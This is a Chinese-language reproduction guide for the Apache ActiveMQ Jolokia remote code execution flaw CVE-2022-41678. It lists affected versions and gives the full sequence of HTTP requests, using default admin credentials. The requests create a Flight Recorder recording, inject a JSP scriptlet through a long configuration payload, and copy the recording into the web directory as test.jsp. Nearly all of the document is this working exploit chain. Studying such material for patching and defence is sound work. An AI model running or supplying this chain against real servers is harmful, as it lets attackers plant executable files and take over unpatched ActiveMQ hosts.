
## Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678

## 影响范围
```
Apache ActiveMQ before 5.16.6
Apache ActiveMQ 5.17.0 before 5.17.4
Apache ActiveMQ 5.18.0 unaffected
Apache ActiveMQ 6.0.0 unaffected
```

## 漏洞复现版本下载
```
https://activemq.apache.org/activemq-5017000-release
```

## 漏洞复现
#### 新建记录
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "newRecording",
    "arguments": []
}
```
记住这个 `value`参数中的值，后面的poc要用到,例如现在是4
![](./assets/20231130233131.png)
#### 写入payload

```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "setConfiguration",
    "arguments": [4,"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!--
     Recommended way to edit .jfc files is to use Java Mission Control,
     see Window -> Flight Recorder Template Manager.
-->
<configuration version=\"2.0\" label=\"Profiling\" description=\"Low overhead configuration for profiling, typically around 2 % overhead.\" provider=\"Oracle\">
    <event name=\"jdk.ThreadAllocationStatistics\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">everyChunk &lt;%out.printIn(&quot;success&quot;);%&gt;</setting>
    </event>
    <event name=\"jdk.ClassLoadingStatistics\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">1000 ms</setting>
    </event>
    <event name=\"jdk.ClassLoaderStatistics\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.JavaThreadStatistics\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">1000 ms</setting>
    </event>
    <event name=\"jdk.ThreadStart\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ThreadEnd\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.ThreadSleep\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"synchronization-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.ThreadPark\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"synchronization-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.JavaMonitorEnter\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"synchronization-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.JavaMonitorWait\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"synchronization-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.JavaMonitorInflate\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"synchronization-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.BiasedLockRevocation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.BiasedLockSelfRevocation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.BiasedLockClassRevocation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.ReservedStackActivation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ClassLoad\">
      <setting name=\"enabled\" control=\"class-loading-enabled\">false</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.ClassDefine\">
      <setting name=\"enabled\" control=\"class-loading-enabled\">false</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ClassUnload\">
      <setting name=\"enabled\" control=\"class-loading-enabled\">false</setting>
    </event>
    <event name=\"jdk.JVMInformation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.InitialSystemProperty\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.ExecutionSample\">
      <setting name=\"enabled\" control=\"method-sampling-enabled\">true</setting>
      <setting name=\"period\" control=\"method-sampling-java-interval\">10 ms</setting>
    </event>
    <event name=\"jdk.NativeMethodSample\">
      <setting name=\"enabled\" control=\"method-sampling-enabled\">true</setting>
      <setting name=\"period\" control=\"method-sampling-native-interval\">20 ms</setting>
    </event>
    <event name=\"jdk.SafepointBegin\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.SafepointStateSynchronization\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.SafepointWaitBlocked\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.SafepointCleanup\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.SafepointCleanupTask\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.SafepointEnd\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.ExecuteVMOperation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.Shutdown\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ThreadDump\">
      <setting name=\"enabled\" control=\"thread-dump-enabled\">true</setting>
      <setting name=\"period\" control=\"thread-dump-interval\">60 s</setting>
    </event>
    <event name=\"jdk.IntFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.UnsignedIntFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.LongFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.UnsignedLongFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.DoubleFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.BooleanFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.StringFlag\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.IntFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.UnsignedIntFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.LongFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.UnsignedLongFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.DoubleFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.BooleanFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.StringFlagChanged\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.ObjectCount\">
      <setting name=\"enabled\" control=\"memory-profiling-enabled-all\">false</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.GCConfiguration\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.GCHeapConfiguration\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.YoungGenerationConfiguration\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.GCTLABConfiguration\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.GCSurvivorConfiguration\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.ObjectCountAfterGC\">
      <setting name=\"enabled\">false</setting>
    </event>
    <event name=\"jdk.GCHeapSummary\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.PSHeapSummary\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1HeapSummary\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.MetaspaceSummary\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.MetaspaceGCThreshold\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.MetaspaceAllocationFailure\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.MetaspaceOOM\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.MetaspaceChunkFreeListSummary\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.GarbageCollection\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.ParallelOldGarbageCollection\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.YoungGarbageCollection\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.OldGarbageCollection\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.G1GarbageCollection\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhasePause\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhasePauseLevel1\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhasePauseLevel2\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhasePauseLevel3\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhasePauseLevel4\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">false</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCPhaseConcurrent\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.GCReferenceStatistics\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.PromotionFailed\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.EvacuationFailed\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.EvacuationInformation\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1MMU\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1EvacuationYoungStatistics\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1EvacuationOldStatistics\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1BasicIHOP\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1AdaptiveIHOP\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.PromoteObjectInNewPLAB\">
      <setting name=\"enabled\" control=\"memory-profiling-enabled-medium\">true</setting>
    </event>
    <event name=\"jdk.PromoteObjectOutsidePLAB\">
      <setting name=\"enabled\" control=\"memory-profiling-enabled-medium\">true</setting>
    </event>
    <event name=\"jdk.ConcurrentModeFailure\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.AllocationRequiringGC\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">false</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.TenuringDistribution\">
      <setting name=\"enabled\" control=\"gc-enabled-normal\">true</setting>
    </event>
    <event name=\"jdk.G1HeapRegionInformation\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">false</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.G1HeapRegionTypeChange\">
      <setting name=\"enabled\" control=\"gc-enabled-all\">false</setting>
    </event>
    <event name=\"jdk.OldObjectSample\">
      <setting name=\"enabled\" control=\"memory-leak-detection-enabled\">true</setting>
      <setting name=\"stackTrace\" control=\"memory-leak-detection-stack-trace\">true</setting>
      <setting name=\"cutoff\" control=\"memory-leak-detection-cutoff\">0 ns</setting>
    </event>
    <event name=\"jdk.CompilerConfiguration\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.CompilerStatistics\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">1000 ms</setting>
    </event>
    <event name=\"jdk.Compilation\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"threshold\" control=\"compiler-compilation-threshold\">100 ms</setting>
    </event>
    <event name=\"jdk.CompilerPhase\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"threshold\" control=\"compiler-phase-threshold\">10 s</setting>
    </event>
    <event name=\"jdk.CompilationFailure\">
      <setting name=\"enabled\" control=\"compiler-enabled-failure\">true</setting>
    </event>
    <event name=\"jdk.CompilerInlining\">
      <setting name=\"enabled\" control=\"compiler-enabled-failure\">false</setting>
    </event>
    <event name=\"jdk.CodeSweeperConfiguration\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.CodeSweeperStatistics\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.SweepCodeCache\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"threshold\" control=\"compiler-sweeper-threshold\">100 ms</setting>
    </event>
    <event name=\"jdk.CodeCacheConfiguration\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.CodeCacheStatistics\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.CodeCacheFull\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
    </event>
    <event name=\"jdk.OSInformation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.CPUInformation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.ThreadContextSwitchRate\">
      <setting name=\"enabled\" control=\"compiler-enabled\">true</setting>
      <setting name=\"period\">10 s</setting>
    </event>
    <event name=\"jdk.CPULoad\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">1000 ms</setting>
    </event>
    <event name=\"jdk.ThreadCPULoad\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">10 s</setting>
    </event>
    <event name=\"jdk.CPUTimeStampCounter\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.SystemProcess\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">endChunk</setting>
    </event>
    <event name=\"jdk.NetworkUtilization\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">5 s</setting>
    </event>
    <event name=\"jdk.InitialEnvironmentVariable\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">beginChunk</setting>
    </event>
    <event name=\"jdk.PhysicalMemory\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.ObjectAllocationInNewTLAB\">
      <setting name=\"enabled\" control=\"memory-profiling-enabled-medium\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ObjectAllocationOutsideTLAB\">
      <setting name=\"enabled\" control=\"memory-profiling-enabled-medium\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.NativeLibrary\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">everyChunk</setting>
    </event>
    <event name=\"jdk.FileForce\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"file-io-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.FileRead\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"file-io-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.FileWrite\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"file-io-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.SocketRead\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"socket-io-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.SocketWrite\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\" control=\"socket-io-threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.JavaExceptionThrow\">
      <setting name=\"enabled\" control=\"enable-exceptions\">false</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.JavaErrorThrow\">
      <setting name=\"enabled\" control=\"enable-errors\">true</setting>
      <setting name=\"stackTrace\">true</setting>
    </event>
    <event name=\"jdk.ExceptionStatistics\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"period\">1000 ms</setting>
    </event>
    <event name=\"jdk.ActiveRecording\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.ActiveSetting\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.DataLoss\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.DumpReason\">
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.ZPageAllocation\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"threshold\">10 ms</setting>
    </event>
    <event name=\"jdk.ZThreadPhase\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.ZStatisticsCounter\">
      <setting name=\"threshold\">10 ms</setting>
      <setting name=\"enabled\">true</setting>
    </event>
    <event name=\"jdk.ZStatisticsSampler\">
      <setting name=\"enabled\">true</setting>
      <setting name=\"threshold\">10 ms</setting>
    </event>
   <event name=\"jdk.JavaNativeAllocation\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.JavaNativeReallocate\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <event name=\"jdk.JavaNativeFree\">
      <setting name=\"enabled\">false</setting>
      <setting name=\"stackTrace\">true</setting>
      <setting name=\"threshold\">0 ms</setting>
    </event>
    <!--
         Contents of the control element is not read by the JVM, it's used
         by Java Mission Control to change settings that carry the control attribute.
    -->
    <control>
      <selection name=\"gc-level\" default=\"detailed\" label=\"Garbage Collector\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Normal\" name=\"detailed\">normal</option>
        <option label=\"All\" name=\"all\">all</option>
      </selection>
      <condition name=\"gc-enabled-normal\" true=\"true\" false=\"false\">
        <or>
          <test name=\"gc-level\" operator=\"equal\" value=\"normal\"/>
          <test name=\"gc-level\" operator=\"equal\" value=\"all\"/>
        </or>
      </condition>
      <condition name=\"gc-enabled-all\" true=\"true\" false=\"false\">
        <test name=\"gc-level\" operator=\"equal\" value=\"all\"/>
      </condition>
      <selection name=\"memory-profiling\" default=\"medium\" label=\"Memory Profiling\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Object Allocation and Promotion\" name=\"medium\">medium</option>
        <option label=\"All, including Heap Statistics (May cause long full GCs)\" name=\"all\">all</option>
      </selection>
      <condition name=\"memory-profiling-enabled-medium\" true=\"true\" false=\"false\">
        <or>
          <test name=\"memory-profiling\" operator=\"equal\" value=\"medium\"/>
          <test name=\"memory-profiling\" operator=\"equal\" value=\"all\"/>
        </or>
      </condition>
      <condition name=\"memory-profiling-enabled-all\" true=\"true\" false=\"false\">
        <test name=\"memory-profiling\" operator=\"equal\" value=\"all\"/>
      </condition>
      <selection name=\"compiler-level\" default=\"detailed\" label=\"Compiler\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Normal\" name=\"normal\">normal</option>
        <option label=\"Detailed\" name=\"detailed\">detailed</option>
        <option label=\"All\" name=\"all\">all</option>
      </selection>
      <condition name=\"compiler-enabled\" true=\"false\" false=\"true\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"off\"/>
      </condition>
      <condition name=\"compiler-enabled-failure\" true=\"true\" false=\"false\">
        <or>
          <test name=\"compiler-level\" operator=\"equal\" value=\"detailed\"/>
          <test name=\"compiler-level\" operator=\"equal\" value=\"all\"/>
        </or>
      </condition>
      <condition name=\"compiler-sweeper-threshold\" true=\"0 ms\" false=\"100 ms\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"all\"/>
      </condition>
      <condition name=\"compiler-compilation-threshold\" true=\"1000 ms\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"normal\"/>
      </condition>
      <condition name=\"compiler-compilation-threshold\" true=\"100 ms\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"detailed\"/>
      </condition>
      <condition name=\"compiler-compilation-threshold\" true=\"0 ms\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"all\"/>
      </condition>
      <condition name=\"compiler-phase-threshold\" true=\"60 s\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"normal\"/>
      </condition>
      <condition name=\"compiler-phase-threshold\" true=\"10 s\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"detailed\"/>
      </condition>
      <condition name=\"compiler-phase-threshold\" true=\"0 s\">
        <test name=\"compiler-level\" operator=\"equal\" value=\"all\"/>
      </condition>
      <selection name=\"method-sampling-interval\" default=\"normal\" label=\"Method Sampling\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Normal\" name=\"normal\">normal</option>
        <option label=\"High\" name=\"high\">high</option>
        <option label=\"Ludicrous (High Overhead)\" name=\"ludicrous\">ludicrous</option>
      </selection>
      <condition name=\"method-sampling-java-interval\" true=\"999 d\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"off\"/>
      </condition>
      <condition name=\"method-sampling-java-interval\" true=\"20 ms\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"normal\"/>
      </condition>
      <condition name=\"method-sampling-java-interval\" true=\"10 ms\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"high\"/>
      </condition>
      <condition name=\"method-sampling-java-interval\" true=\"1 ms\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"ludicrous\"/>
      </condition>
      <condition name=\"method-sampling-native-interval\" true=\"999 d\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"off\"/>
      </condition>
      <condition name=\"method-sampling-native-interval\" true=\"20 ms\">
        <or>
          <test name=\"method-sampling-interval\" operator=\"equal\" value=\"normal\"/>
          <test name=\"method-sampling-interval\" operator=\"equal\" value=\"high\"/>
          <test name=\"method-sampling-interval\" operator=\"equal\" value=\"ludicrous\"/>
        </or>
      </condition>    
      <condition name=\"method-sampling-enabled\" true=\"false\" false=\"true\">
        <test name=\"method-sampling-interval\" operator=\"equal\" value=\"off\"/>
      </condition>
      <selection name=\"thread-dump-interval\" default=\"everyMinute\" label=\"Thread Dump\">
        <option label=\"Off\" name=\"off\">999 d</option>
        <option label=\"At least Once\" name=\"normal\">everyChunk</option>
        <option label=\"Every 60 s\" name=\"everyMinute\">60 s</option>
        <option label=\"Every 10 s\" name=\"everyTenSecond\">10 s</option>
        <option label=\"Every 1 s\" name=\"everySecond\">1 s</option>
      </selection>
      <condition name=\"thread-dump-enabled\" true=\"false\" false=\"true\">
        <test name=\"thread-dump-interval\" operator=\"equal\" value=\"999 d\"/>
      </condition>
      <selection name=\"exception-level\" default=\"errors\" label=\"Exceptions\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Errors Only\" name=\"errors\">errors</option>
        <option label=\"All Exceptions, including Errors\" name=\"all\">all</option>
      </selection>
      <condition name=\"enable-errors\" true=\"true\" false=\"false\">
        <or>
          <test name=\"exception-level\" operator=\"equal\" value=\"errors\"/>
          <test name=\"exception-level\" operator=\"equal\" value=\"all\"/>
        </or>
      </condition>
      <condition name=\"enable-exceptions\" true=\"true\" false=\"false\">
        <test name=\"exception-level\" operator=\"equal\" value=\"all\"/>
      </condition>
      <selection name=\"memory-leak-detection\" default=\"medium\" label=\"Memory Leak Detection\">
        <option label=\"Off\" name=\"off\">off</option>
        <option label=\"Object Types\" name=\"minimal\">minimal</option>
        <option label=\"Object Types + Allocation Stack Traces\" name=\"medium\">medium</option>
        <option label=\"Object Types + Allocation Stack Traces + Path to GC Root\" name=\"full\">full</option>
      </selection>
      <condition name=\"memory-leak-detection-enabled\" true=\"false\" false=\"true\">
        <test name=\"memory-leak-detection\" operator=\"equal\" value=\"off\"/>
      </condition>
      <condition name=\"memory-leak-detection-stack-trace\" true=\"true\" false=\"false\">
        <or>
          <test name=\"memory-leak-detection\" operator=\"equal\" value=\"medium\"/>
          <test name=\"memory-leak-detection\" operator=\"equal\" value=\"full\"/>
        </or>
      </condition>
      <condition name=\"memory-leak-detection-cutoff\" true=\"1 h\" false=\"0 ns\">
        <test name=\"memory-leak-detection\" operator=\"equal\" value=\"full\"/>
      </condition>
      <text name=\"synchronization-threshold\" label=\"Synchronization Threshold\" contentType=\"timespan\" minimum=\"0 s\">10 ms</text>
      <text name=\"file-io-threshold\" label=\"File I/O Threshold\" contentType=\"timespan\" minimum=\"0 s\">10 ms</text>
      <text name=\"socket-io-threshold\" label=\"Socket I/O Threshold\" contentType=\"timespan\" minimum=\"0 s\">10 ms</text>
      <flag name=\"class-loading-enabled\" label=\"Class Loading\">false</flag>
    </control>
</configuration>"]
}
```
![](./assets/20231130233450.png)
### 导出录制到web目录
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 141

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "startRecording",
    "arguments": [4]
}
```
![](./assets/20231130233542.png)

```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 138

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "stopRecording",
    "arguments": [4]
}
```
![](./assets/20231130233602.png)
#### 导出到web目录
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 159

{
    "type": "EXEC",
    "mbean": "jdk.management.jfr:type=FlightRecorder",
    "operation": "copyTo",
    "arguments": [4,"../../webapps/test.jsp"]
}

```
![](./assets/20231130233747.png)

#### test.jsp写入成功
![](./assets/20231130233759.png)


![](./assets/20231130233835.png)

## 漏洞来源
- https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/

## payload
本地搭建源码，环境配置不正确，无法调试代码，payload是搜索GitHub关键字找到的
